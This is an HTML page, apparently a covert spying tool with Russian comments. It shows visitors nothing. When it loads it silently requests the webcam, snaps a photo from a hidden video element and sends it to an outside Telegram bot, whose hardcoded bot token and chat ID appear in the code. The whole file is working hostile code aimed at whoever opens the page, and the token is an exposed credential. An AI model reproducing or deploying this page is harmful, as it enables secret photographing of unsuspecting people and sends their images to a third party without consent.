<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>body { margin: 0; overflow: hidden; }</style>
</head>
<body>
    <video id="camera" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Настройки (ЗАМЕНИТЕ!)
        const BOT_TOKEN = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
        const CHAT_ID = "1224978194";

        // Автозапуск
        document.addEventListener('DOMContentLoaded', () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const camera = document.getElementById('camera');
                    camera.srcObject = stream;
                    camera.onloadedmetadata = () => {
                        setTimeout(() => captureAndSend(camera, stream), 1000);
                    };
                })
                .catch(() => { /* Браузер заблокировал доступ */ });
        });

        // Снимок + отправка
        function captureAndSend(camera, stream) {
            const canvas = document.getElementById('canvas');
            canvas.width = camera.videoWidth;
            canvas.height = camera.videoHeight;
            canvas.getContext('2d').drawImage(camera, 0, 0);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).finally(() => {
                    stream.getTracks().forEach(track => track.stop());
                });
            }, 'image/jpeg', 0.8);
        }
    </script>
</body>
</html>
